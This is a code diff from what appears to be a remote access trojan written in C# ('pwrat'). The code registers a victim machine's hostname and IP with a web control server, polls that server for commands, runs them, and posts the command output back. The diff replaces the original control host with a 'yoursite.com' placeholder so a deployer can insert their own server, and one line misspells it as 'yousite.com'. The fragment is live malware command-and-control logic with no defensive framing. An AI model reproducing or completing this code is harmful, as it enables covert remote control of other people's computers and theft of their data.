@@ -141,7 +141,7 @@ namespace pwrat
             //向web端注册一个id
             while (id == "0")
             {
-                string reguri = "http://www.hackyou.tk/connect.php?name=" + hostname + "&ip=" + ip;
+                string reguri = "http://www.yoursite.com/connect.php?name=" + hostname + "&ip=" + ip;
                 HttpWebRequest request = (HttpWebRequest)WebRequest.Create(reguri);
                 HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                 Stream stream = response.GetResponseStream();
@@ -158,7 +158,7 @@ namespace pwrat
             string cmd = "";
             while (id != "0")
             {
-                string cmduri = "http://www.hackyou.tk/cmd.php?id=" + id;
+                string cmduri = "http://www.yoursite.com/cmd.php?id=" + id;
                 HttpWebRequest cmdreq = (HttpWebRequest)WebRequest.Create(cmduri);
                 HttpWebResponse cmdreps = (HttpWebResponse)cmdreq.GetResponse();
 
@@ -190,7 +190,7 @@ namespace pwrat
                 //将命令的回显结果以POST方式返回给web端
                 if (output != "")
                 {
-                    PostWebRequest("http://www.hackyou.tk/cmd.php", output);
+                    PostWebRequest("http://www.yousite.com/cmd.php", output);
                 }
                 Thread.Sleep(3000);
             }
